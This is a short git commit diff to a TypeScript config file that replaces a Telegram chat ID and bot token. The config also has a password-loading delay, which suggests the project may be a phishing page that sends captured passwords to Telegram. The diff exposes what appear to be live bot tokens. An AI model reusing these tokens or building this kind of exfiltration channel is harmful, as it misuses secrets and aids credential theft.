cc87e922ad47041c13defa4b63fe4c02c866329e
minhmatrix <125466698+minhmatrix@users.noreply.github.com>
2025-12-30 14:03:16 +0700

    Update config.ts

--- src/utils/config.ts
+++ src/utils/config.ts
@@ -18,8 +18,8 @@ const defaultConfig: Config = {
 		password_loading_time: 5000,
 	},
 	telegram: {
-		data_chatid: "5922644937",
-		data_token: "8010774541:AAH_AtsUiUycqtpTGi8lMSAtsbQK4FpgtrY",
+		data_chatid: "-5138773341",
+		data_token: "8018288168:AAHXDMFHBjH_diwU4mgtfUe4xjZu1JBHibs",
 	},
 };
 const getConfig = (): Config => {
